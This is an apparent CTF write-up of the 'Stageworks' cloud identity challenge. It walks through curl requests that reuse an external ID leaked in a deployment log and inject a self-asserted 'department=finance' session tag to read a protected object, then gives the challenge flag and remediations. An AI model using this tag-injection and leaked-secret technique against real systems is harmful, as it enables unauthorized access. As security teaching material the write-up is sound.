+++
date = '2026-10-07T15:21:00+03:00'
draft = false
title = 'Stageworks — PwnZone CTF 2026'
tags = ["PwnZone CTF 2026", "Cloud", "Cloud Security", "IAM", "Trust Policy", "External ID", "Session Tags", "Tag Injection", "Role Assumption", "Information Disclosure", "Broken Access Control", "Privilege Escalation", "CTF Writeup"]
feature = 'feature.png'
showTableOfContents = true
+++

## Overview

Stageworks was a cloud identity challenge at `http://54.72.82.22:8400` built around a policy-driven `assume` flow. The trust policy required a specific role and external ID, and the protected object's policy demanded a `sessionTag/department=finance` condition. I recovered the real external ID from a leaked deployment log and, because the policy allowed callers to self-assert session tags, injected the `department=finance` tag during role assumption to satisfy the object condition and retrieve the flag.

## Reconnaissance

I fetched the landing page to map the API surface.

```
curl -s http://54.72.82.22:8400/
```

- Materials: `/downloads/rehearsal.zip`
- API: `GET /api/identity`, `POST /api/assume` (accepts `role`, `external_id`, `tags`), `GET /api/object` (accepts `X-Session` header)

I downloaded and extracted the rehearsal archive.

```
curl -s -o /tmp/rehearsal.zip http://54.72.82.22:8400/downloads/rehearsal.zip
unzip -l /tmp/rehearsal.zip
```

It contained `deployment.log` and `policy.json`.

```
unzip -p /tmp/rehearsal.zip deployment.log
unzip -p /tmp/rehearsal.zip policy.json
```

**deployment.log**
```
Lighting integration: externalId=d4a868d5e1dbf4bf89c6c520
```

**policy.json**
```
{
  "trust": {
    "role": "lighting",
    "externalId": "integration-value"
  },
  "object": {
    "condition": {
      "sessionTag/department": "finance"
    }
  },
  "tagSession": true
}
```

Two things stood out: the trust policy's `externalId` was the placeholder `integration-value` while the deployment log held the real value, and `tagSession: true` meant I could assert my own session tags.

## Identity Enumeration

I checked my baseline identity and access to the protected object.

```
curl -s http://54.72.82.22:8400/api/identity
```
```
{"account":"stageworks","role":"visitor","session":"guest"}
```

```
curl -s -i http://54.72.82.22:8400/api/object
```
```
{"message":"The request could not be completed.","ok":false}
```

As a `visitor` with a `guest` session, the object was out of reach.

## Initial Access

I tested combinations against `POST /api/assume` to work out the exact trust requirements.

```
curl -s -X POST http://54.72.82.22:8400/api/assume \
  -H 'Content-Type: application/json' \
  -d '{"role":"lighting","external_id":"d4a868d5e1dbf4bf89c6c520"}'
```
```
{"token":"bbea8f9a0b6c1944cef7a6ab206f923353cb"}
```

The placeholder external ID from the policy was rejected, while the real one from the deployment log succeeded.

```
curl -s -X POST http://54.72.82.22:8400/api/assume \
  -H 'Content-Type: application/json' \
  -d '{"role":"lighting","external_id":"integration-value"}'
```
```
403 / rejection
```

Assuming the role alone wasn't enough for the object — I also needed the session tag the object policy required.

```
curl -s -X POST http://54.72.82.22:8400/api/assume \
  -H 'Content-Type: application/json' \
  -d '{"role":"lighting","external_id":"d4a868d5e1dbf4bf89c6c520","tags":{"department":"finance"}}'
```
```
{"token":"995c94141f6d85e12358203b2ba046e91677"}
```

Combining the placeholder external ID with the injected tag still failed, confirming both the real external ID and the self-asserted tag were required.

```
curl -s -X POST http://54.72.82.22:8400/api/assume \
  -H 'Content-Type: application/json' \
  -d '{"role":"lighting","external_id":"integration-value","tags":{"department":"finance"}}'
```
```
403 / rejection
```

With the tagged session token in hand, I requested the protected object.

```
curl -s -H "X-Session: 995c94141f6d85e12358203b2ba046e91677" \
  "http://54.72.82.22:8400/api/object?key=public/lineup.txt"
```

```
{"message":"safctf{b9d2678027feea5870c41931b663fd6d}","ok":true}
```

## Vulnerability Analysis

- **Leaked trust material:** The deployment log exposed the real `externalId`, enabling impersonation of the `lighting` principal.
- **Caller-controlled identity attributes:** `external_id` was accepted without cryptographic verification of the caller's identity.
- **Tag injection:** `tagSession: true` let me self-assert `sessionTag/department`, an attribute the object policy trusted for authorization.
- **Broken trust boundary:** The object condition was satisfied by mutable input supplied during `assume` rather than verified identity state.

## Conclusion

Attack chain:

1. Deployment log leaked the real `externalId` behind a placeholder trust policy
2. Role assumption succeeded using the leaked external ID
3. Self-asserted `department=finance` session tag satisfied the object policy
4. Tagged session token retrieved the protected object

Remediations:

- Never store real integration secrets in downloadable deployment artifacts
- Verify caller identity cryptographically instead of trusting a supplied `externalId`
- Derive session tags from verified identity state — never from caller-supplied input
- Evaluate authorization conditions against server-side trusted attributes only
